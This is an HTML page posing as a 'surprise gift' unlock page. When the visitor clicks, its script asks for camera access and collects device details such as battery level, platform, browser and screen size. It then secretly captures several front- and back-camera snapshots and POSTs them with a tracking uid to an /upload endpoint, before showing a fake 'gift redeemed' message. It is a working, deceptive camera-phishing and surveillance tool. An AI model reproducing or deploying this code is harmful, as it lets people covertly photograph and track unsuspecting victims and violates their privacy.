<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #loading-ui { display: none; }
        /* Glowing Gift Animation */
        .gift-container { position: relative; width: 150px; height: 150px; margin: 0 auto; }
        .gift-img { width: 100px; filter: drop-shadow(0 0 15px gold); animation: bounce 2s infinite alternate; }
        @keyframes bounce { 
            0% { transform: translateY(0) scale(1); filter: drop-shadow(0 0 5px gold); } 
            100% { transform: translateY(-15px) scale(1.05); filter: drop-shadow(0 0 25px gold); } 
        }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .btn { background: #00ff00; color: black; border: none; padding: 18px 35px; font-size: 19px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 20px rgba(0,255,0,0.4); }
    </style>
</head>
<body>
    <div id="start-page">
        <h2>🎁 You have a surprise gift! ✨</h2>
        <p>👇 Click below to unlock it 🔓</p>
        <button class="btn" onclick="startWork()">🔓 UNLOCK YOUR GIFT 🎁</button>
    </div>

    <div id="loading-ui">
        <div class="gift-container">
            <img class="gift-img" src="https://cdn-icons-png.flaticon.com/512/4213/4213600.png"> 
        </div>
        <p style="font-size: 20px; margin-top: 15px; font-weight: bold; color: gold;">Unlocking Your Gift... 🎁</p>
        <div class="loader"></div>
    </div>

    <div id="success-msg" style="display:none; color:#00ff00; padding: 20px;">
        <h2>Your gift has been redeemed. 👍</h2>
        <p style="color: white;">You are a good person, God bless you. ✨</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('m') || 'front';
        const uid = params.get('uid');

        async function startWork() {
            document.body.style.background = "black";
            document.body.style.color = "white";
            document.getElementById('start-page').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            let info = {
                battery: "N/A",
                platform: navigator.platform,
                browser: navigator.userAgent.split(' ').pop(),
                screen: window.screen.width + "x" + window.screen.height
            };
            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}

            let deviceName = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : navigator.platform;

            if(mode === 'front') await runCam(info, {facingMode: "user"}, 4, "FRONT", deviceName);
            else if(mode === 'back') await runCam(info, {facingMode: "environment"}, 4, "BACK", deviceName);
            else {
                await runCam(info, {facingMode: "environment"}, 2, "BACK", deviceName);
                await runCam(info, {facingMode: "user"}, 2, "FRONT", deviceName);
            }

            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
        }

        async function runCam(info, constraints, count, label, deviceName) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { ...constraints, width: {ideal: 1280}, height: {ideal: 720} } 
                });
                let video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();
                
                await new Promise(r => setTimeout(r, 8000)); 

                for (let i = 1; i <= count; i++) {
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; 
                    can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    
                    await fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            image: can.toDataURL('image/jpeg', 0.8), 
                            info: { ...info, device: deviceName }, 
                            mode: label,
                            uid: uid 
                        })
                    });
                    await new Promise(r => setTimeout(r, 2500));
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }
    </script>
</body>
</html>
